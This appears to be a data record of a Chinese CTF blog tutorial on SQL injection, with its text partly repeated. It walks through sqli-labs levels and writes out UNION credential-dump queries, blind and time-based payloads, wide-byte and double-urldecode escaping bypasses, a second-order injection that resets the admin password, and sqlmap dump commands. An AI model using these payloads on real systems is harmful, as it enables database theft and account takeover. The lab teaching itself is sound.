sqlmap.py -u http://xxx.com/?id=1 --dbs --batch\t\t//输入点为id参数 --dbs参数用于探测数据库，--batch参数用于自动执行默认选项（省的我们在探测过程中一直按Y）\n```\n\n如果只有一个注入点，可以不用在url两边加上双引号，如果有两个注入点，则需要将url用双引号括起来\n\n```bash\npy sqlmap.py -u \"http://xxx.com/?id=1&digree=high\" --dbs --batch\n```\n\n如果需要的数据就在本数据库里，则可以省去上面这一步，直接进行接下来的爆表，爆字段的操作\n\n```bash\npy sqlmap.py -u http://xxx.com/?id=1 --tables --batch\t\t//爆表\n假如爆出表名‘flag’\n```\n\n```bash\npy sqlmap.py -u http://xxx.com/?id=1 -T flag --columns --batch\t\t//爆字段\n假如爆出字段‘flag’\n```\n\n```bash\npy sqlmap.py -u http://xxx.com/?id=1 -T flag -C flag --dump --batch\t\t//爆出数据\n到这里就可以拿到我们想要的字段里的数据了\n```\n\n\n\n### 布尔型盲注\n\n采用以下语句拆（猜）解字符串\n\n猜解数据库名字长度\n\n```mysql\n?id =1' and length(database())><=N --+\n```\n\n猜测数据库名字。\n\n```mysql\n?id =1' and ascii(substr(database(),1,1))><=N --+\t\t（利用二分法，ascii为ascii码，例如97=‘a’）\n```\n\n> SUBSTR(str,pos,len): 从pos开始的位置，截取len个字符\n>\n> 所以substr(database(),1,1)意思是截取数据库名的第一个字符，用这种方式猜解数据库的第1，2，3...到最后一个字符。\n>\n> SUBSTR(str,pos): pos开始的位置，一直截取到最后 \n\n6、猜表名\n\n```mysql\n?id=1' and (ascii(substr((select table_name from  information_schema.tables where  table_schema=database()),1,1)))><=N --+）\n```\n 7、猜列名：\n```mysql\n?id=1' and (ascii(substr((select column_name from  information_schema.columns where table_schema=database() and  table_name=‘表名’ limit 0,1),1,1)))><=N --+ (如果报错可以加limit 0,1)\n```\n 8、查字段\n```mysql\n?id=1' and length((select 列名 from 数据库.表名 limit 0,1))>0 --+\n然后重复以上猜解字符串手法\n```\n\n**实际上，还是直接使用sqlmap方便**，直接在命令后面加 --technique B参数，则是指定进行布尔型注入（Boolen）。默认情况是BEUSTQ，即全部方式\n\n SQLMAP目前支持的注入方式包括（默认全进行）：\n\n>   B: Boolean-based blind SQL injection（布尔型注入）\n>\n>   E: Error-based SQL injection（报错型注入）\n>\n>   U: UNION query SQL injection（可联合查询注入）\n>\n>   S: Stacked queries SQL injection（可多语句查询注入）\n>\n>   T: Time-based blind SQL injection（基于时间延迟注入）\n>\n>   Q: Inline SQL Injection (内联注入)\n\n### 延时盲注\n\n跟布尔盲注类似，也是猜解字符串，只不过由于前端回显更不明显，需要使用if和sleep语句来判断注入结果\n\n判断：\n\n```\n?id=1’ and sleep(5)\t\t// 响应时间比正常情况多5秒，则存在延时注入\n```\n\n\n查数据库\n```\n?id=1’and if((ascii(substr(database(),1,1))>114) ,sleep(5),0)\n```\n其他操作方式与布尔型类似。\n例如：\n尝试延时注入\n\n```\n?id=1’ and sleep(5) --+ \t//第一步,判断是否有延时注入\n?id=1' and if(length(database())><=N,sleep(5),0) --+\t\t//第二步，猜测数据库名长度\n?id=1’and if((ascii(substr(database(),1,1))>114) ,sleep(5),0) --+ \t//第三步猜测数据库名\n```\n\n**手工注入是不可能手工注入的，还是sqlmap省事**，加参数 --technique=T，时间注入一步到位。\n\n\n\n### 宽字节注入\n\nGBK编码每个字符占两字节（bytes）\n\nASCII编码每个字符占一字节\n\n**重点：注入原理**\n\n**PHP中使用的编码方式为GBK，**\n\n**函数执行（参数等）使用的是ASCII编码；**\n\n**而MYSQL使用的默认字符集是GBK等宽字节字符集。**\n\n当后端用PHP的函数（如addslashes()、mysql_real_escape_string()、mysql_escape_string()等函数）对用户输入进行检测，对危险字符进行转义时，就有可能发生宽字节注入漏洞。\n\n当源码中设置”set character_set_client=gbk”  时\n\n%df%27 可把程序中转义函数过滤的“\\ ” （%5c）吃掉。\n\n> 如addslashes()函数会在用户输入的单引号 ' （%27）前面加一个反斜杠 \\ （%5c），但如果我们在单引号前面加一个%df，即%df%27，经过addslashes()函数过滤后就变成了 %df%5c%27 ，但是在GBK编码中，%df%5c是一个汉字 “縗”\n\n例如：\n\n`/1.php?id=1`存在宽字节注入时，则: `/1.php?id=-1’and 1=1%23 `,-1后面的单引号会被转义成  \\’\n\n但是提交：\n\n```\n /1.php?id=-1%df’and 1=1%23\n```\n\n 时，\n\n`%df`和 反斜杠 \\ (%5c) 组合 `%df%5c`  编码后是一个 縗 字，这时候单引号依然存在，则会闭合成功，形成宽字节注入，使得后面的and语句成功执行。\n\n\n\n### 二次注入\n\n二次注入就是先在网站服务器里储存一些数据，这些数据可以构成恶意语法，然后再利用这些数据完成攻击，比如在该网站注册一个账号，用账号名字或密码作为payload执行注入攻击。这是最基本的原理。\n\n例如：如果有某网站的后台登录SQL语句是这样的\n\n```mysql\nSELECT * FROM users WHERE username='$username' and password='$password'\n```\n\n如果，我们先注册一个用户，用户名为\"admin' -- \"，且前端后端都通过了（现实场景是基本不太可能的，写题有一定可能），那么，当我们登录这个用户时，这个语句就变成了\n\n```mysql\nSELECT * FROM users WHERE username='admin' -- ' and password='$password'\n```\n\n这样，就直接登录了**admin**账户，如果admin账户存在的话。这就是二次注入的基本原理。\n\n可以抽象概括为两步：\n\n1.插入恶意数据\n\n2.引用恶意数据\n\n**应用场景**\n\nWeb应用程序常使用\n\naddslashes() 、mysql_real_escape_string()、mysql_escape_string()函数\n\n或者开启GPC（`magic_quote_gpc=on`,***开启之后，能自动实现addslashes()和stripslashes()这两个函数的功能***）\n\n来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠(\\)和NULL加上反斜杠转义。\n\n\n\n二次注入适用于绕过addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数，因为这些转义函数是用在第一次输入web服务器时，执行php语句时生效的，当储存入数据库，它该是怎么样就是怎么样了\n\n比如：\n\n`admin' -- `这个输入，直接传入后台经过addslashes()函数过滤后，就变成了`admin\\' -- `，这个嵌入sql语句是没用的，无法闭合sql语句。\n\n```\nUPDATE users SET PASSWORD='$pass' where username='admin\\' -- ' and password='$curr_pass'\n```\n\n但是如果把它作为一个账户名注册入数据库，它在数据库里就是`admin' -- `。这时我们先以这个`admin' -- `账户的身份登录进去，然后修改其密码，由于这时的账户名大概率不再经过addslashes()等函数的过滤了（已经以这个账户的身份登录进去了，语句中的用户名是直接从数据库中读出或者通过session传递的），仍然是`admin' -- `，也是说，后台sql语句是\n\n```mysql\nUPDATE users SET PASSWORD='$pass' where username='admin' -- ' and password='$curr_pass'\n```\n\n` -- `后面的语句被注释，也就是说，我们修改的是admin账户的密码。\n\n**sqli-labs实例分析**\n\n**less-24**\n\n![image-20210122114946180](/img/image-20210122114946180.png)\n\n一个登录界面，有创建新用户，也有忘记密码。\n\n登录的后端源码是这样的\n\n![image-20210122123420557](/img/image-20210122123420557.png)\n\n用户名密码全都用mysql_real_escape_string()函数过滤了，所以直接注入是会被转义掉单引号的\n\n我们先看看数据库中有哪些用户名\n\n![image-20210122115233156](/img/image-20210122115233156.png)\n\nsqli的数据库是security,users表中有以上用户名和密码\n\n那么我们构建一个`admin' -- -`用户，新建一下\n\n看一下创建新用户的源码\n\n![image-20210122115619387](/img/image-20210122115619387.png)\n\n可以看到三个输入都是用mysql_escape_string()函数过滤了的\n\n然而\n\n![image-20210122124433626](/img/image-20210122124433626.png)\n\n存储到数据库中的数据就是原始数据，我们可以看到表中多了一行`admin' -- -`用户的数据\n\n现在以这个用户的身份登录\n\n![image-20210122125026004](/img/image-20210122125026004.png)\n\n这里我们可以看到，它的界面上显示的用户名是`admin' -- -`，没有转义符号反斜杠`\\`，为什么呢？我们看看源码\n\n![image-20210122130743856](/img/image-20210122130743856.png)\n\n它输出的是session中的\"username\"\n\nsession中的“username”是哪来的呢？在login.php里面\n\n![login.php](/img/image-20210122131034335.png)\n\n这里显示的很清楚了，$row是数据库查询结果返回的结果集列表，sqllogin()函数返回$row[1]给$login变量，$login变量再赋值给$_SESSION[\"username\"]，所以session中的username是从数据库中读取的，未经过安全函数过滤。\n\n然后我们来修改密码\n\n![pass-change.php](/img/image-20210122131804080.png)\n\n以上是pass-change.php文件中的代码，可以看到$username由session赋值，然后用于sql语句中也就是说，此时它的sql语句实际上是\n\n```mysql\nUPDATE users SET PASSWORD='$pass' where username='admin' -- -' and password='$curr_pass' \n```\n\n`admin`用单引号闭合而且后面被注释掉了，此时我们操作的用户实际上是`admin`用户\n\n把密码改成`12345`\n\n![修改成功](/img/image-20210122132251979.png)\n\n再来看看数据库\n\n![admin的密码变成了12345](/img/image-20210122132407600.png)\n\n第8行数据中，admin用户的密码变成了12345，sql注入成功，我们修改了admin用户的密码，可以直接登录admin账户了\n\n**二次urldecode 注入**\n\nWeb应用程序通常使用\n\naddslashes() 、mysql_real_escape_string()、mysql_escape_string()函数\n\n或者开启GPC（`magic_quote_gpc=on`,*开启之后，能自动实现addslshes()和stripslashes()这两个函数的功能*）\n\n来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠(\\)和NULL加上反斜杠转义。\n\n如果某处使用了urldecode或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入，即二次urldecode注入。\n\n\n\n**原理：**\n\n由于我们提交参数到webserver时，webserver会自动解码一次，当提交参数\n\n```\nid=1%2527\n```\n\n经过第一次解码后，%25 解码结果为 %，则参数此时为id=1%27\n\n第二次程序使用了urldecode 或者 rawurldecode  函数来解码id参数，则解码后结果为\n\n```\nid=1'\n```\n\n这时单引号成功出现，输入闭合，绕过了转义函数或GPC，可以在后面添加执行sql注入语句了。\n\n这个的原理类似于上面的宽字节注入\n\n## HTTP头注入\n\n### User-agent\n\n后台SQL语句中使用了HTTP头中的`User-agent`字段中的数据\n\n```\nsqlmap > py sqlmap.py -u “url” --dbs --level=3\n```\n\n### Cookie\n\n后台SQL语句中使用了HTTP头中`Cookie`字段中的数据\n\n```\nsqlmap > py sqlmap.py -u “url” --dbs --level=3\n```\n\n### Refer\n\n后台SQL语句中使用了HTTP头中的`Refer`字段中的数据\n\n```\nsqlmap > py sqlmap.py -u “url” --dbs --level=3\n```\n\n### Host\n\n后台SQL语句中使用了HTTP头中的`host`字段中的数据\n\n```\nsqlmap > py sqlmap.py -u “url” --dbs --level=5\n```\n\n以上几种注入漏洞的执行原理非常“普通”，只不过注入点位置特殊而已，熟练运用sqlmap工具即可轻松解决\n\n## POST注入\n\n上面的http头注入其实就是一种稍微特殊的post注入，**post注入**，顾名思义，就是注入点在post表单里的sql注入漏洞，一般手工注入需要借助工具（Burpsuite）抓包，然后修改post数据。\n\n利用sqlmap进行post注入有几种方式\n\n**1.普通的表单注入**\n\n在表单中，例如登陆页面，如果不知道哪个参数存在注入点，可以直接添加`--forms`命令参数\n\n```\nsqlmap > py sqlmap.py -u “url” --forms --batch\n```\n\n**2.带参数的表单注入**\n\n如果已知某个参数有注入漏洞，如\"id=1&time=2001\"\n\n```\nsqlmap > py sqlmap.py -u “url” --data “id=1&time=2001” --batch\n```\n\n**3.使用文件指定参数的表单（HTTP头）注入**\n\n比如已知注入点为id，在post表单中\n\n用Burpsuite抓包，把报头保存为`post.txt`，放在sqlmap同目录下（或者随便放哪，到时候带路径就行，懂得都懂）\n\n```\nsqlmap > py sqlmap.py -r post.txt -p id --dbs --batch \t//用-p参数指定注入点\n或者\nsqlmap > py sqlmap.py -r post.txt --level=3 --batch \t//指定探测级别，level 3级别就会自动探测http头\n```\n\n要在http头中进行注入，只要在需要探测的字段后面添加一个`*`号，sqlmap就会自动对其进行探测了，如Referer注入就在Referer字段后面添加一个`*`号。\n\n```\nReferer: http://127.0.0.1/sqli/Less-19/*\n```\n\n**4.使用Burpsuite带sqlmap插件注入**\n\n很简单，bp上配置好sqlmap插件后，右键，发送到sqlmap，然后流程和上面差不多，添加*号，或者指定参数。\n\n## GET报错注入\n\n\n\n","source":"_posts/2021-1-16-SQL手工注入.md","raw":"---\nlayout: post\ntitle: ctf手工SQL注入\ndate: 2021-1-16\ncategories: blog\ntags: [ctf,web]\ndescription: 详解ctf中的SQL手工注入\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# SQL注入 \n\nSQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令的 web攻击方式。权限大时可写入webshell，后门，系统命令执行，权限小时可通过注入获得系统敏感信息（管理员账号密码，重要数据等），修改数据库信息。\n\n\n\n> 按照注入点类型来分类\n\n### （1）数字型注入点\n\n许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。\n\n这一类的 SQL 语句原型大概为 `select * from 表名 where id=1 ` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`\n\n### （2）字符型注入点\n\n网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。\n\n若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。\n\n### （3）搜索型注入点\n\n这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `\"keyword=关键字\"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。\n\n此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`\n\n> 按照数据提交的方式来分类\n\n### （1）GET 注入\n\n提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/index.php?id=1 , id 是注入点。\n\n### （2）POST 注入\n\n使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。\n\n### （3）Cookie 注入\n\nHTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。\n\n### （4）HTTP 头部注入\n\n注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。\n\n> 按照执行效果来分类\n\n### （1）基于布尔的盲注\n\n即可以根据返回页面判断条件真假的注入。\n\n### （2）基于时间的盲注\n\n即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。\n\n### （3）基于报错注入\n\n即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。\n\n1. 单引号\n2. 双引号\n3. 基于数字型注入\n\n### （4）联合查询注入\n\n可以使用union的情况下的注入。\n\n### （5）堆查询注入\n\n可以同时执行多条语句的执行时的注入。\n\n### （6）宽字节注入\n\n宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）\n\n### 基于sqli-labs的实践操作\n\n#### 1.基于报错的GET sql注入\n\n##### less-1\n\n![](/img/less-1.png)\n\n提示说输入一个数字作为ID的值\n\n那么先在url输入?id=1\n\n![](/img/less-1输入id=1.png)\n\n显示查询成功，返回了用户Dumb\n\n然后尝试使其报错，输入 ?id=1'\n\n![](/img/less-1输入id-1'.png)\n\n报错了，显示为 ''1'' LIMIT 0,1'\n\n有了这个，我们就可以揣测一下网站后端的sql请求语句了\n\n首先，这个报错语句是被 ' ' 单引号闭合的，于是将其拆分 '   '1'' LIMIT 0,1   '，可知报错的段落是 '1'' LIMIT 0,1,由于我们输入的id值是1'\n\n,所以再拆分一下为'   1'   ' LIMIT 0,1\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"\n```\n\n id被单引号包裹，这是字符型注入点\n\n##### less-2\n\n![](/img/less-2.png)\n\n流程与上面差不多\n\n不同的是，这次输入id=1'后报错为 '' LIMIT 0,1'\n\n还是用和上面一样的方法拆分这段 ，'     ' LIMIT 0,1      '  -->' LIMIT 0,1\n\n可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id =$id limit 0,1 \"\n```\n\nid没有被单引号包裹，这是一个数字型注入点\n\n##### less-3\n\n![](/img/less-3.png)\n\n这次的报错是 ''1'') LIMIT 0,1'\n\n拆分 '   '1'') LIMIT 0,1   '-->'1'') LIMIT 0,1-->'   *1'*   ') LIMIT 0,1\n\n显然，后台语句是\n\n```mysql\n\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"\n```\n\n但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了\n\n比如上面这个less-3\n\n我们试着把输入改为 id=1') --+或id=1') --%20\n\n![](/img/--+.png)\n\n\n\n![](/img/-- .png)\n\n都成功了，这就说明后台语句和我们想的八九不离十了\n\n##### less-4\n\n这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被\"\"包裹了，输入的id值都会被当作字符串，加单引号括号都没用。\n\n那就使用\\来制造报错，输入 id=1\\\n\n返回报错 '\"1\\\\\") LIMIT 0,1'-->\"1\\\\\") LIMIT 0,1\n\n\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错\n\n合理推测：\n\n```mysql\n\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"\n```\n\n验证：\n\n![](/img/less-4.png)\n\n这样4种不同的注入点的后台语句就通过报错大致的试出来了\n\n之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等\n\n例如less-1(字符型) 就可以输入?id=1' order by 1[,2,3,4... ] --+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用\n\nless-1能够order by到3，也就是它有3个字段，于是接下来union注入\n\n我们要构造的语句是SELECT [username,password] FROM user WHERE id = '0' union select 1,2,3 --+ limit 0,1\n\n所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0' union select 1,2,3 --+\n\n这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果\n\n效果\n\n![](/img/union注入.png)\n\n可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用\n\n于是接下来注入 id=0' union select 1,user(),database() --+\n\n![](/img/union爆库.png)\n\n爆出了用户名和使用的数据库名\n\n然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入\n\n例如：\n\n爆表：\n\n```mysql\nid=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+\n```\n\n​\t\t\tinformation_schema是储存了所有数据库信息的库，tables储存了所有表信息的表\n\n![](/img/union爆表.png)\n\n看到了最后一个表是'users',可用于下一步爆字段\n\n爆字段：\n\n```mysql\nid=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+\t\t//记得最后这个表名要加单引号，不然没用\n```\n\n![](/img/union爆字段.png)\n\n爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了\n\n```mysql\nid=0' union select 1,group_concat(username,0x3a,password),3 from [security.]users --+\t\t//有时候要在表名前面加上数据库名，不然也出不来,即 这个环境下的security.\n```\n\n![](/img/union爆出账号密码.png)\n\n好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了\n\n## 利用SQLmap工具进行sql注入\n\n进入SQLmap工具目录打开命令行，输入命令\n\n```bash\npy sqlmap.py -u http://xxx.com/?id=1 --dbs --batch\t\t//输入点为id参数 --dbs参数用于探测数据库，--batch参数用于自动执行默认选项（省的我们在探测过程中一直按Y）\n```\n\n如果只有一个注入点，可以不用在url两边加上双引号，如果有两个注入点，则需要将url用双引号括起来\n\n```bash\npy sqlmap.py -u \"http://xxx.com/?id=1&digree=high\" --dbs --batch\n```\n\n如果需要的数据就在本数据库里，则可以省去上面这一步，直接进行接下来的爆表，爆字段的操作\n\n```bash\npy sqlmap.py -u http://xxx.com/?id=1 --tables --batch\t\t//爆表\n假如爆出表名‘flag’\n```\n\n```bash\npy sqlmap.py -u http://xxx.com/?id=1 -T flag --columns --batch\t\t//爆字段\n假如爆出字段‘flag’\n```\n\n```bash\npy sqlmap.py -u http://xxx.com/?id=1 -T flag -C flag --dump --batch\t\t//爆出数据\n到这里就可以拿到我们想要的字段里的数据了\n```\n\n\n\n### 布尔型盲注\n\n采用以下语句拆（猜）解字符串\n\n猜解数据库名字长度\n\n```mysql\n?id =1' and length(database())><=N --+\n```\n\n猜测数据库名字。\n\n```mysql\n?id =1' and ascii(substr(database(),1,1))><=N --+\t\t（利用二分法，ascii为ascii码，例如97=‘a’）\n```\n\n> SUBSTR(str,pos,len): 从pos开始的位置，截取len个字符\n>\n> 所以substr(database(),1,1)意思是截取数据库名的第一个字符，用这种方式猜解数据库的第1，2，3...到最后一个字符。\n>\n> SUBSTR(str,pos): pos开始的位置，一直截取到最后 \n\n6、猜表名\n\n```mysql\n?id=1' and (ascii(substr((select table_name from  information_schema.tables where  table_schema=database()),1,1)))><=N --+）\n```\n 7、猜列名：\n```mysql\n?id=1' and (ascii(substr((select column_name from  information_schema.columns where table_schema=database() and  table_name=‘表名’ limit 0,1),1,1)))><=N --+ (如果报错可以加limit 0,1)\n```\n 8、查字段\n```mysql\n?id=1' and length((select 列名 from 数据库.表名 limit 0,1))>0 --+\n然后重复以上猜解字符串手法\n```\n\n**实际上，还是直接使用sqlmap方便**，直接在命令后面加 --technique B参数，则是指定进行布尔型注入（Boolen）。默认情况是BEUSTQ，即全部方式\n\n SQLMAP目前支持的注入方式包括（默认全进行）：\n\n>   B: Boolean-based blind SQL injection（布尔型注入）\n>\n>   E: Error-based SQL injection（报错型注入）\n>\n>   U: UNION query SQL injection（可联合查询注入）\n>\n>   S: Stacked queries SQL injection（可多语句查询注入）\n>\n>   T: Time-based blind SQL injection（基于时间延迟注入）\n>\n>   Q: Inline SQL Injection (内联注入)\n\n### 延时盲注\n\n跟布尔盲注类似，也是猜解字符串，只不过由于前端回显更不明显，需要使用if和sleep语句来判断注入结果\n\n判断：\n\n```\n?id=1’ and sleep(5)\t\t// 响应时间比正常情况多5秒，则存在延时注入\n```\n\n\n查数据库\n```\n?id=1’and if((ascii(substr(database(),1,1))>114) ,sleep(5),0)\n```\n其他操作方式与布尔型类似。\n例如：\n尝试延时注入\n\n```\n?id=1’ and sleep(5) --+ \t//第一步,判断是否有延时注入\n?id=1' and if(length(database())><=N,sleep(5),0) --+\t\t//第二步，猜测数据库名长度\n?id=1’and if((ascii(substr(database(),1,1))>114) ,sleep(5),0) --+ \t//第三步猜测数据库名\n```\n\n**手工注入是不可能手工注入的，还是sqlmap省事**，加参数 --technique=T，时间注入一步到位。\n\n\n\n### 宽字节注入\n\nGBK编码每个字符占两字节（bytes）\n\nASCII编码每个字符占一字节\n\n**重点：注入原理**\n\n**PHP中使用的编码方式为GBK，**\n\n**函数执行（参数等）使用的是ASCII编码；**\n\n**而MYSQL使用的默认字符集是GBK等宽字节字符集。**\n\n当后端用PHP的函数（如addslashes()、mysql_real_escape_string()、mysql_escape_string()等函数）对用户输入进行检测，对危险字符进行转义时，就有可能发生宽字节注入漏洞。\n\n当源码中设置”set character_set_client=gbk”  时\n\n%df%27 可把程序中转义函数过滤的“\\ ” （%5c）吃掉。\n\n> 如addslashes()函数会在用户输入的单引号 ' （%27）前面加一个反斜杠 \\ （%5c），但如果我们在单引号前面加一个%df，即%df%27，经过addslashes()函数过滤后就变成了 %df%5c%27 ，但是在GBK编码中，%df%5c是一个汉字 “縗”\n\n例如：\n\n`/1.php?id=1`存在宽字节注入时，则: `/1.php?id=-1’and 1=1%23 `,-1后面的单引号会被转义成  \\’\n\n但是提交：\n\n```\n /1.php?id=-1%df’and 1=1%23\n```\n\n 时，\n\n`%df`和 反斜杠 \\ (%5c) 组合 `%df%5c`  编码后是一个 縗 字，这时候单引号依然存在，则会闭合成功，形成宽字节注入，使得后面的and语句成功执行。\n\n\n\n### 二次注入\n\n二次注入就是先在网站服务器里储存一些数据，这些数据可以构成恶意语法，然后再利用这些数据完成攻击，比如在该网站注册一个账号，用账号名字或密码作为payload执行注入攻击。这是最基本的原理。\n\n例如：如果有某网站的后台登录SQL语句是这样的\n\n```mysql\nSELECT * FROM users WHERE username='$username' and password='$password'\n```\n\n如果，我们先注册一个用户，用户名为\"admin' -- \"，且前端后端都通过了（现实场景是基本不太可能的，写题有一定可能），那么，当我们登录这个用户时，这个语句就变成了\n\n```mysql\nSELECT * FROM users WHERE username='admin' -- ' and password='$password'\n```\n\n这样，就直接登录了**admin**账户，如果admin账户存在的话。这就是二次注入的基本原理。\n\n可以抽象概括为两步：\n\n1.插入恶意数据\n\n2.引用恶意数据\n\n**应用场景**\n\nWeb应用程序常使用\n\naddslashes() 、mysql_real_escape_string()、mysql_escape_string()函数\n\n或者开启GPC（`magic_quote_gpc=on`,***开启之后，能自动实现addslashes()和stripslashes()这两个函数的功能***）\n\n来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠(\\)和NULL加上反斜杠转义。\n\n\n\n二次注入适用于绕过addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数，因为这些转义函数是用在第一次输入web服务器时，执行php语句时生效的，当储存入数据库，它该是怎么样就是怎么样了\n\n比如：\n\n`admin' -- `这个输入，直接传入后台经过addslashes()函数过滤后，就变成了`admin\\' -- `，这个嵌入sql语句是没用的，无法闭合sql语句。\n\n```\nUPDATE users SET PASSWORD='$pass' where username='admin\\' -- ' and password='$curr_pass'\n```\n\n但是如果把它作为一个账户名注册入数据库，它在数据库里就是`admin' -- `。这时我们先以这个`admin' -- `账户的身份登录进去，然后修改其密码，由于这时的账户名大概率不再经过addslashes()等函数的过滤了（已经以这个账户的身份登录进去了，语句中的用户名是直接从数据库中读出或者通过session传递的），仍然是`admin' -- `，也是说，后台sql语句是\n\n```mysql\nUPDATE users SET PASSWORD='$pass' where username='admin' -- ' and password='$curr_pass'\n```\n\n` -- `后面的语句被注释，也就是说，我们修改的是admin账户的密码。\n\n**sqli-labs实例分析**\n\n**less-24**\n\n![image-20210122114946180](/img/image-20210122114946180.png)\n\n一个登录界面，有创建新用户，也有忘记密码。\n\n登录的后端源码是这样的\n\n![image-20210122123420557](/img/image-20210122123420557.png)\n\n用户名密码全都用mysql_real_escape_string()函数过滤了，所以直接注入是会被转义掉单引号的\n\n我们先看看数据库中有哪些用户名\n\n![image-20210122115233156](/img/image-20210122115233156.png)\n\nsqli的数据库是security,users表中有以上用户名和密码\n\n那么我们构建一个`admin' -- -`用户，新建一下\n\n看一下创建新用户的源码\n\n![image-20210122115619387](/img/image-20210122115619387.png)\n\n可以看到三个输入都是用mysql_escape_string()函数过滤了的\n\n然而\n\n![image-20210122124433626](/img/image-20210122124433626.png)\n\n存储到数据库中的数据就是原始数据，我们可以看到表中多了一行`admin' -- -`用户的数据\n\n现在以这个用户的身份登录\n\n![image-20210122125026004](/img/image-20210122125026004.png)\n\n这里我们可以看到，它的界面上显示的用户名是`admin' -- -`，没有转义符号反斜杠`\\`，为什么呢？我们看看源码\n\n![image-20210122130743856](/img/image-20210122130743856.png)\n\n它输出的是session中的\"username\"\n\nsession中的“username”是哪来的呢？在login.php里面\n\n![login.php](/img/image-20210122131034335.png)\n\n这里显示的很清楚了，$row是数据库查询结果返回的结果集列表，sqllogin()函数返回$row[1]给$login变量，$login变量再赋值给$_SESSION[\"username\"]，所以session中的username是从数据库中读取的，未经过安全函数过滤。\n\n然后我们来修改密码\n\n![pass-change.php](/img/image-20210122131804080.png)\n\n以上是pass-change.php文件中的代码，可以看到$username由session赋值，然后用于sql语句中也就是说，此时它的sql语句实际上是\n\n```mysql\nUPDATE users SET PASSWORD='$pass' where username='admin' -- -' and password='$curr_pass' \n```\n\n`admin`用单引号闭合而且后面被注释掉了，此时我们操作的用户实际上是`admin`用户\n\n把密码改成`12345`\n\n![修改成功](/img/image-20210122132251979.png)\n\n再来看看数据库\n\n![admin的密码变成了12345](/img/image-20210122132407600.png)\n\n第8行数据中，admin用户的密码变成了12345，sql注入成功，我们修改了admin用户的密码，可以直接登录admin账户了\n\n**二次urldecode 注入**\n\nWeb应用程序通常使用\n\naddslashes() 、mysql_real_escape_string()、mysql_escape_string()函数\n\n或者开启GPC（`magic_quote_gpc=on`,*开启之后，能自动实现addslshes()和stripslashes()这两个函数的功能*）\n\n来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠(\\)和NULL加上反斜杠转义。\n\n如果某处使用了urldecode或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入，即二次urldecode注入。\n\n\n\n**原理：**\n\n由于我们提交参数到webserver时，webserver会自动解码一次，当提交参数\n\n```\nid=1%2527\n```\n\n经过第一次解码后，%25 解码结果为 %，则参数此时为id=1%27\n\n第二次程序使用了urldecode 或者 rawurldecode  函数来解码id参数，则解码后结果为\n\n```\nid=1'\n```\n\n这时单引号成功出现，输入闭合，绕过了转义函数或GPC，可以在后面添加执行sql注入语句了。\n\n这个的原理类似于上面的宽字节注入\n\n## HTTP头注入\n\n### User-agent\n\n后台SQL语句中使用了HTTP头中的`User-agent`字段中的数据\n\n```\nsqlmap > py sqlmap.py -u “url” --dbs --level=3\n```\n\n### Cookie\n\n后台SQL语句中使用了HTTP头中`Cookie`字段中的数据\n\n```\nsqlmap > py sqlmap.py -u “url” --dbs --level=3\n```\n\n### 